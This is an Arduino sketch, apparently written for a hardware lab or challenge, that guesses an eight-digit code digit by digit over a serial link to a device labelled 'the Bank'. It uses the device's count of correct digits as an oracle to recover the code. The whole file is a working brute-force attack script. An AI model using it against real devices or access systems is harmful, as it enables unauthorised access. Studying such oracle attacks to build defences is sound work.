#include <Arduino.h>
#include <SoftwareSerial.h>

const int numDigits = 8;
const int numPossibleValues = 10;
const int bankDelay = 100; // TODO: Change to correct bank delay (number of milliseconds to pause)

// Define the TX and RX pins
const int txPin = 12; // BLUE
const int rxPin = 13; // RED

// Create a SoftwareSerial object
SoftwareSerial serial(txPin, rxPin);

void setup() {

  serial.begin(9600);
  Serial.begin(9600);
}

void loop() {
  int password[numDigits] = {0};
  int correctDigits = 0;

  for (int i = 0; i < numDigits; i++) {
    bool digitFound = false; // Flag to check if the current digit has been found

    for (int j = 0; j < numPossibleValues; j++) {
      password[i] = j;
      String passwordStr = "";
      for (int k = 0; k < numDigits; k++) {
        passwordStr += String(password[k]);
      }
      passwordStr += "\n";

      // Sending Code over to bank
      serial.println(passwordStr);

      // Wait for the Bank to respond
      delay(bankDelay);
      // Retreive Banks response
      int response = serial.parseInt();

      Serial.println("###################################");
      
      Serial.println("passwordStr");
      Serial.println(passwordStr);

      Serial.println("RESPONSE");
      Serial.println(response);

      Serial.println("correctDigits");
      Serial.println(correctDigits);

      Serial.println("digitFound");
      Serial.println(digitFound);

      Serial.println("###################################");


      if (response > correctDigits) {
        correctDigits = response;
        digitFound = true;
        break; // move on to the next digit
      }

    }
    if (!digitFound) {
      i--;  // Decrease the digit index to retry the current digit
    }
  }

  // password is correct!
  serial.println("Password is correct!");
  delay(5000);
}
